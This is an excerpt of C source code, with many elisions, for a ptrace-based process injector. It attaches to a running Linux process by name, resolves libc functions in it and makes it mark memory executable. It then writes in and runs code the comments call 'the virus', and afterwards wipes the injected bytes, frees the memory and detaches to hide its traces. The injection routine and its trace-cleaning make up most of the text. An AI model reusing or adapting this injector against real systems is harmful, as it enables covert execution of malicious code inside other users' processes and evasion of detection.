...
/*
	 Return the tracee address, in unsigned long format, of the libc function
	 specify by function_addr.
	 Parameter : tracee_pid -> pid of the tracee
	 						 function_addr ->  the address of the desired function
*/
	                                             ...
	                                             const unsigned long function_addr)
{
	...
	libc_function_address = function_addr -
...
/*
	...
	the specify function should return an integer and takes an integer
	Parameter : pid -> pid of the tracee
              ...
              parameter -> parameter of the function to call
*/
						 	       ...
						 	       const int parameter)
{
	...
	regs.rdi = (unsigned long long)parameter;
	...
	/* Open the file and put a breakpoint to regain controle of the execution*/
	if(NULL == (fd = fopen(mem,"r+"))){
		fprintf(stderr,"Can't open file at line %d\n",__LINE__);
	}
	fseek(fd, (long)running_function, SEEK_SET);
	if(fwrite(&bp,1,1,fd) == 0){
		perror("error when writing bp");
	}
	fclose(fd);
	if(ptrace(PTRACE_CONT,pid,NULL,NULL) < 0){
		fprintf(stderr,"Fail to restart the processus at line %d\n",__LINE__);
...
/*
	Call free in the tracee
	Parameter : pid -> pid of the tracee
							running_function -> address of the function currently running
							function_to_call_address -> address of the function to call
							code -> instruction injected at the beginning of the running function
							address_to_free -> address pass as parameter to free()
*/
static void call_free(const pid_t pid,
	                    const unsigned long running_function,
					 		        const unsigned long function_to_call_address,
							        unsigned char * code,
							        const unsigned long address_to_free)
{
	...
	/* get the value of the registers's processus while the program  is trapped
		 in the execution of running_function  */
	if(ptrace(PTRACE_GETREGS,pid,NULL,&backup_regs) < 0){
		fprintf(stderr,"Fail to get the registers at line %d\n",__LINE__);
		exit(-1);
	}
...
int main(int argc, char* argv[]){
	...
	/* Get the pid of the process we want to trace */
	const pid_t tracee_pid = get_pid(argv[1]);

	/*****************************************************************************
		Gather all the addresses of the function that are going to be needed during
	...
	*****************************************************************************/
	...
	/* Get the address of the free function in the tracee */
	const unsigned long free_addr = get_libc_function_address(tracee_pid,
		                                                       (unsigned long)free);
	...
	************************************/
	...
	if(ptrace(PTRACE_ATTACH,tracee_pid,NULL,NULL) != -1){
		printf("~~~~~\nAttaching to the process %s (pid=%d).\n", argv[1], tracee_pid);
		printf("Beginning of the injection...\n");
	}
	else{
		perror("Can't attach to processus");
		return -1;
	}
	...
	printf("~~~~~\nAddress of the memory allocated : 0x%lx\n", allocated_mem);
	...
	/* NEED to put all 3 protections because mprotect overwrite the previous ones
		 and the heap, initially, has rw- privilege */
	...
	printf("~~~~~\nMemory at the allocated address after writing the content of the virus :\n");
	/* Write the content of the virus inside the tracee memory */
	putdata(tracee_pid, allocated_mem, sizeofvirus, data);

	free(data);

	/* Make the tracee call the virus function */
	const int virus_ret = call_func(tracee_pid, running_func_addr, allocated_mem,
		                              indirect_call, 9);

	printf("~~~~~\nReturn value of the virus : %d\n", virus_ret);


	/********************************
		Cleaning part of the injection
	********************************/

	/* Filling an array with only null bytes */
	unsigned char * cleaning = malloc(sizeof(char) * (size_t)sizeofvirus);
	for(int i=0; i < sizeofvirus; i++){
		cleaning[i] = 0x00;
	}

	printf("~~~~~\nMemory of the tracee after cleaning the code cache :\n");
	/* Cleaning the code cache by writting 0x00 inside the tracee memory */
	putdata(tracee_pid, allocated_mem, sizeofvirus, cleaning);

	free(cleaning);

	/* Restore the previous protection */
	call_mprotect(tracee_pid, running_func_addr, mprotect_addr, indirect_call,
		            align_allocated_mem, (size_t)pagesize, PROT_READ|PROT_WRITE);


	/* Make the tracee free the memory allocated */
	call_free(tracee_pid, running_func_addr, free_addr,
		        indirect_call, align_allocated_mem);

	/* Detach and restart the processus */
	if(ptrace(PTRACE_DETACH,tracee_pid,NULL,NULL) != -1){
		printf("~~~~~\nInjection succesful, now detaching the process %s...\n", argv[1]);
	}
	else{
		perror("Error when detaching processus");
		return -1;
	}
